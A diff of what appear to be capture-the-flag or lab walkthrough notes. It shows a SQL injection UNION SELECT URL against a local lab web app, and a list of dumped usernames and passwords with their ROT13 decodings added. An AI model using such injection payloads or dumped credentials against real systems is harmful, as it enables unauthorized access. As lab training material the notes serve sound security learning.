@@ -153,11 +153,11 @@ All possible combo's the last one is the most promising ;)
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,user_id FROM siteusers.users
 ______________________________________________________________________________________________________________
 ## From the last golden statement we tried we got usernames and possible passwords
-### Placing them below to test which ones work
-    Aaron    ncnffjbeqlCn$$jbeq
-    user2    RntyrfVfNER78
-    user3    Obo4GURRnccyrf
-    Lroth    anotherpassword4THEages
+### Placing them below to test which ones work (hint: some of the passwords are using ROT13, use cyber chef)
+    Aaron    ncnffjbeqlCn$$jbeq            apasswordyPa$$word
+    user2    RntyrfVfNER78                 EaglesIsARE78
+    user3    Obo4GURRnccyrf                Bob4THEEapples
+    Lroth    anotherpassword4THEages       nabgurecnffjbeq4GURntrf #this one wasn't encoded
 ______________________________________________________________________________________________________________
 ## NONE OF THE SSH ABOVE WORKS
 ### So take your happy ass back to the first box and scan that network ;)
